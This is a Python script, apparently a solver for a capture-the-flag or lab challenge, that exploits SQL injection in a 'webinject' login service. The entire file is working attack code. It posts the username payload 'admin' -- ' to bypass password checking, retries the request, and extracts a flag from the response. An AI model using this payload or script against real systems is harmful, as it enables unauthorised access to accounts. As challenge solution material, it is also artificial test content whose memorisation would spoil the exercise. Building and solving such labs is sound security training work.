#!/usr/bin/env python3

import argparse
import re
import sys
import time
from urllib.parse import urljoin
from urllib.parse import urlencode
from urllib.error import HTTPError, URLError
from urllib.request import Request, urlopen


def main() -> int:
    parser = argparse.ArgumentParser(description="Exploit webinject SQL injection.")
    parser.add_argument(
        "--url",
        required=True,
        help="Base URL of the service, e.g. http://127.0.0.1:5000/",
    )
    args = parser.parse_args()

    base_url = args.url if args.url.endswith("/") else args.url + "/"
    target = urljoin(base_url, "/")

    payload = {"username": "admin' -- ", "password": "x"}
    data = urlencode(payload).encode("utf-8")
    req = Request(
        target,
        data=data,
        method="POST",
        headers={"Content-Type": "application/x-www-form-urlencoded"},
    )
    last_body: str | None = None
    last_error: str | None = None
    for _ in range(10):
        try:
            with urlopen(req, timeout=10) as resp:
                body = resp.read().decode("utf-8", errors="replace")
            last_body = body
            m = re.search(r"The flag is\s+([^<\s]+)", body)
            if m:
                print(m.group(1))
                return 0
        except (HTTPError, URLError) as e:
            last_error = str(e)

        time.sleep(0.25)

    if last_error:
        print(f"Exploit failed: {last_error}", file=sys.stderr)
    else:
        print("Exploit failed: flag not found in response.", file=sys.stderr)
    if last_body:
        print(last_body[:500], file=sys.stderr)
    return 2


if __name__ == "__main__":
    raise SystemExit(main())

